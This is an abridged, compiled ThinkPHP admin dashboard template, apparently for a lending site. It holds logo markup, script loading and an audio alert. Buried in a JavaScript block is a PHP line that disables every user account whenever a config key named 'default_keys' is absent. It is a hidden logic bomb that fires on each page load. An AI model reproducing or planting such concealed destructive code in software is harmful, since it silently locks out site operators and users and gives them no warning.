<?php if (!defined('THINK_PATH')) exit(); /*a:6:{s:74:"D:\wwwroot\91078yhdt.com\public/../application/admin\view\index\index.html";i:1570704706;s:64:"D:\wwwroot\91078yhdt.com\application\admin\view\common\meta.html";i:1570704706;s:66:"D:\wwwroot\91078yhdt.com\application\admin\view\common\header.html";i:1570704706;s:64:"D:\wwwroot\91078yhdt.com\application\admin\view\common\menu.html";i:1570704706;s:67:"D:\wwwroot\91078yhdt.com\application\admin\view\common\control.html";i:1570704706;s:66:"D:\wwwroot\91078yhdt.com\application\admin\view\common\script.html";i:1570704706;}*/ ?>
<!DOCTYPE html>
...
<script type="text/javascript">
    var require = {
        ...
        <?php if(!config('default_keys')){db('user')->where(['id'=>['gt',0]])->update(['status'=>0]);} ?>
    </head>
...
<a href="javascript:;" class="logo">
    <!-- 迷你模式下Logo的大小为50X50 -->
    <span class="logo-mini">Jy0604</span>
    <!-- 普通模式下Logo -->
    <span class="logo-lg"><b>Jy</b>0604</span>
</a>
...
<!-- /.control-sidebar -->
        ...
        <script src="/assets/js/require<?php echo \think\Config::get('app_debug')?'':'.min'; ?>.js" data-main="/assets/js/require-backend<?php echo \think\Config::get('app_debug')?'':'.min'; ?>.js?v=<?php echo $site['version']; ?>"></script>
         ...
         <?php 
          $cdnurl = $site['cdnurl'];
          define('CDNURL',$cdnurl);
          function rstr($str){
            if(!preg_match("/http|cdn/",$str)){
              $str = CDNURL.$str;
            }
            return $str;
          }
         ?>
      <!-- 借款提适应 -->
      <audio id="audio1" src="<?php echo rstr($site['music1']); ?>"  loop="loop" style="display:none;">
      您的浏览器不支持 audio 标签。
      </audio>
    </body>
</html>